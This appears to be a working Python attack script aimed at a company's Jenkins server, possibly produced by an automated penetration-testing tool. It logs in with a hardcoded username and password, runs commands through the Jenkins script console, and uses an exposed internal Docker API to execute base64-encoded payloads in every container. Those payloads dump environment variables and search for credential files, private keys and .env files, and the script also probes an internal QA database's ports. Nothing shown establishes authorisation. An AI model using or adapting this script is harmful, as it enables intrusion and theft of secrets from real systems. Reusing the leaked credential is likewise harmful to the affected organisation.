# kimi2_docker_exec2.py — follow-up: fixed-quoting env/secret dump + QA DB check
# Payloads base64-encoded to survive Groovy -> bash -> docker exec sh quoting layers.
import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar, sys, time

sys.stdout.reconfigure(errors='replace')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script, timeout=300):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=timeout).read().decode(errors='replace')

def b64(s):
    return base64.b64encode(s.encode()).decode()

# ---- inner commands that run INSIDE each container ----
CMD_SECRETS = b64(
    'echo "---ENV---"; env | sort; '
    'echo "---HOSTS---"; cat /etc/hosts; '
    'echo "---ID---"; id; '
    'echo "---WORKSPACE---"; ls -la /workspace 2>/dev/null | head -30; '
    'echo "---JENKINSHOME---"; find /home/jenkins -maxdepth 3 2>/dev/null | head -40; '
    'echo "---ENVFILES---"; find / -maxdepth 4 \\( -name ".env" -o -name "credentials.xml" -o -name "*.pem" -o -name "id_rsa*" \\) 2>/dev/null | grep -v /proc | head -20'
)
CMD_QADB = b64(
    '(echo > /dev/tcp/172.27.141.15/3306) 2>/dev/null && echo DB_3306_OPEN || echo DB_3306_CLOSED; '
    '(echo > /dev/tcp/172.27.141.15/443) 2>/dev/null && echo DB_443_OPEN || echo DB_443_CLOSED; '
    '(echo > /dev/tcp/172.27.141.15/22) 2>/dev/null && echo DB_22_OPEN || echo DB_22_CLOSED'
)

GROOVY_TMPL = r'''
def r = ["bash","-c","""
DOCKER=http://172.27.140.148:4243
CONTAINERS=\$(curl -s \$DOCKER/containers/json | python -c "import sys,json;[sys.stdout.write(c['Id'][:12]+'\\n') for c in json.load(sys.stdin)]")
for CID in \$CONTAINERS; do
 echo "=== Container: \$CID ==="
 EXEC_ID=\$(curl -s -X POST \$DOCKER/containers/\$CID/exec -H 'Content-Type: application/json' -d '{"Cmd":["bash","-c","echo __B64__ | base64 -d | bash"],"AttachStdout":true,"AttachStderr":true}' | python -c "import sys,json;print json.load(sys.stdin).get('Id','FAIL')")
 echo "exec: \$EXEC_ID"
 if [ "\$EXEC_ID" != "FAIL" ]; then
  curl -s -X POST \$DOCKER/exec/\$EXEC_ID/start -H 'Content-Type: application/json' -d '{"Detach":false,"Tty":false}' 2>/dev/null
 fi
 echo
done"""].execute().text
println r
'''

def run(name, script):
    print('=' * 78)
    print('### %s  [%s]' % (name, time.strftime('%H:%M:%S')))
    print('=' * 78)
    try:
        out = jenkins_exec(script)
    except Exception as e:
        out = 'ERROR: %r' % (e,)
    print(out)
    sys.stdout.flush()
    return out

if __name__ == '__main__':
    results = {}
    results['secrets_full'] = run('TASK 2b — FULL ENV/SECRET DUMP (b64 payload)',
                                  GROOVY_TMPL.replace('__B64__', CMD_SECRETS))
    results['qadb_check'] = run('TASK 3b — QA DB 172.27.141.15 REACHABILITY (b64 payload)',
                                GROOVY_TMPL.replace('__B64__', CMD_QADB))
    with open(r'c:\xampp\htdocs\pentagi\claroshop_attack\kimi2_docker_exec2_results.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print('=' * 78)
    print('DONE — results saved to kimi2_docker_exec2_results.json')
